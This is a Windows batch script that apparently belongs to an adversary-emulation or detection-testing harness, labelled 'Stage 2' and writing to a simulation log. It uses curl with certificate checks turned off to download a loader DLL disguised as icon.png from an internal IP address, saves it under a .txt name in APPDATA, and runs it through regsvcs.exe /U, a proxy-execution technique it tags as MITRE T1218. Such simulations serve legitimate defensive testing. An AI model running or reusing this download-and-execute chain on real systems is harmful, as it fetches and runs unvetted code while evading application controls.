@echo off
setlocal enabledelayedexpansion

REM Placeholder constant declarations with random variable names
set v1=%APPDATA%\10901\1d66ec85
set v2=a81c0fdf.txt
set v3=https://10.0.0.49/stage/2/icon.png?10901-7
set v4=ITZEL-S2B
set v5=10901
set v6=7
set v7=%PUBLIC%\\macula-simulations.log

REM Capture timestamp once for all debug and TTP log lines
set ts=!DATE!/!TIME!

REM ---- Debug: heartbeat download start ----
echo [!ts!][DEBUG][!v4!][!v5!]: heartbeat_start>> "!v7!" 2>nul

REM Stage 2 BAT Step 1: Download loader DLL via curl heartbeat
curl -k -s -o "!v1!\!v2!" "!v3!"
set curl_exit=!errorlevel!

REM Debug: heartbeat download complete
echo [!ts!][DEBUG][!v4!][!v5!]: heartbeat_complete=!curl_exit!>> "!v7!" 2>nul

REM Stage 2 BAT Step 2: Change working directory to output dir
echo [!ts!][DEBUG][!v4!][!v5!]: chdir_start>> "!v7!" 2>nul
cd /d "!v1!" >nul 2>&1
set cd_exit=!errorlevel!
echo [!ts!][DEBUG][!v4!][!v5!]: chdir_result=!cd_exit!>> "!v7!" 2>nul

REM Stage 2 BAT Step 3: Invoke loader via regsvcs.exe /U (LOLBIN proxy execution)
echo [!ts!][DEBUG][!v4!][!v5!]: regsvcs_start>> "!v7!" 2>nul
%SystemRoot%\Microsoft.NET\Framework64\v4.0.30319\regsvcs.exe /U "!v2!" >NUL 2>&1
set regsvcs_exit=!errorlevel!
echo [!ts!][DEBUG][!v4!][!v5!]: regsvcs_result=!regsvcs_exit!>> "!v7!" 2>nul

REM Stage 2 BAT Step 4: Log TTP result
if !regsvcs_exit! equ 0 (
    set result=OK
    set error=
) else (
    set result=FAIL
    set error=!regsvcs_exit!
)
echo [!ts!][TTP][!v4!][!v5!]: T1218|System Binary Proxy Execution=!result!:!error!>> "!v7!" 2>nul

endlocal
exit /b 0